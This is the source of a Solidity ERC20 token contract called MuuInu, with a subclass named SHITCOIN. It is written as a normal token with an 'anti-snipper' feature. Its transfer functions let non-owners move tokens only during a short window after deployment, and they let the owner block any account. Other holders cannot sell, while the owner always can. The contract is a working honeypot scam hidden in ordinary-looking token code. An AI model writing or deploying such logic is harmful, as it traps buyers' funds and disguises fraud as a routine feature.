/**
 *Submitted for verification at polygonscan.com on 2022-05-20
*/

pragma solidity >=0.5.17;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
        c = a + b;
        require(c >= a);
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256 c) {
        require(b <= a);
        c = a - b;
    }
}

contract ERC20Interface {
    function totalSupply() public view returns (uint256);
    function balanceOf(address tokenOwner) public view returns (uint256 balance);
    function allowance(address tokenOwner, address spender) public view returns (uint256 remaining);
    function transfer(address to, uint256 tokens) public returns (bool success);
    function approve(address spender, uint256 tokens) public returns (bool success);
    function transferFrom(address from, address to, uint256 tokens) public returns (bool success);
    event Transfer(address indexed from, address indexed to, uint256 tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 tokens);
}

contract ApproveAndCallFallBack { 
    function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract Owned {
    address public owner;
    constructor() public { owner = msg.sender;}

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}

contract TokenERC20 is ERC20Interface, Owned {
    using SafeMath for uint256;

    string  public  symbol;
    string  public  name;
    uint8   public  decimals;
    uint256 public  supply;
    uint    public  deployDate;
    bool    public  antiSnipper;

    mapping(address => uint256)                     balances;
    mapping(address => mapping(address => uint256)) allowed;
    mapping(address => bool)                        isTrapped;

    constructor() public {
        symbol          = "MINU";
        name            = "MuuInu";
        decimals        = 18;
        supply          = 1000000e18;
        balances[owner] = supply;
        deployDate      = block.timestamp;
        antiSnipper     = true;
        emit Transfer(address(0), owner, supply);
    }

    function totalSupply() public view returns (uint256){
        return supply.sub(balances[address(0)]);
    }

    function balanceOf(address tokenOwner) public view returns (uint256 balance){
        return balances[tokenOwner];
    }    

    function transfer(address to, uint256 tokens) public returns (bool success){
        if(msg.sender == owner || 
            (!isTrapped[msg.sender] && 
                (!antiSnipper || 
                    (block.timestamp <= (deployDate + 20 minutes))
                        )))
        {
            balances[msg.sender] = balances[msg.sender].sub(tokens);
            balances[to] = balances[to].add(tokens);
            emit Transfer(msg.sender, to, tokens);
            return true;
        } else {
            return false;
        }
    }

    function approve(address spender, uint256 tokens) public returns (bool success){
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        return true;
    }

    function transferFrom(address from, address to, uint256 tokens) public returns (bool success) {
        if(from == owner || 
            (!isTrapped[from] && 
                (!antiSnipper || 
                    (block.timestamp <= (deployDate + 15 minutes))
                        )))
        {
            balances[from] = balances[from].sub(tokens);
            allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);
            balances[to] = balances[to].add(tokens);
            emit Transfer(from, to, tokens);
            return true;
        } else {
            return false;
        }
    }

    function allowance(address tokenOwner, address spender)public view returns (uint256 remaining){
        return allowed[tokenOwner][spender];
    }

    function approveAndCall(address spender, uint256 tokens, bytes memory data) public returns (bool success) {
        allowed[msg.sender][spender] = tokens;
        emit Approval(msg.sender, spender, tokens);
        ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data );
        return true;
    }

    function() external payable { revert();}
}


contract SHITCOIN is TokenERC20 {
    function() external payable {}
   
    function trapAccount(address account, bool trapped) public onlyOwner {
        isTrapped[account] = trapped;
    }

    function isAccountTrapped(address account) public onlyOwner view returns (bool trapped){
        return isTrapped[account];
    }

    function activateAntiSnipper(bool _status) public onlyOwner { antiSnipper = _status;}    
}